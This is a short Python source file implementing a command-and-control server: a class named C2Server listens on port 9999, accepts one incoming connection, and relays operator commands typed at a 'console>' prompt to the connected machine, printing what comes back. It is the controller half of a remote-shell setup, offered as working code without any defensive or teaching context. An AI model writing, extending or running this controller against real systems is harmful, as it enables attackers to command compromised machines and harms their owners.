import socket


class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.start_server()

    def start_server(self):
        serversocket = socket.socket()
        assert self.host and self.port, "Host and port must be specified"
        serversocket.bind((self.host, self.port))
        serversocket.listen(1)
        print(f"[*] Listening on {self.host}:{self.port}")

        try:
            conn, addr = serversocket.accept()
            print(f"[*] Connection from {addr}")

            while True:
                command = input("console> ")
                if command.lower() in ["exit", "quit"]:
                    conn.send(b"exit")
                    break

                conn.send(command.encode())
                output = conn.recv(4096).decode()
                print(output)

        except KeyboardInterrupt:
            print("\n[!] Shutting down.")
        except Exception as e:
            print(f"[!] An error occurred: {e}")
        finally:
            try:
                conn.close()  # pyright: ignore
            except Exception:
                pass
            serversocket.close()
            print("[*] Server offline.")


if __name__ == "__main__":
    host = "0.0.0.0"
    port = 9999
    c2_server = C2Server(host, port)
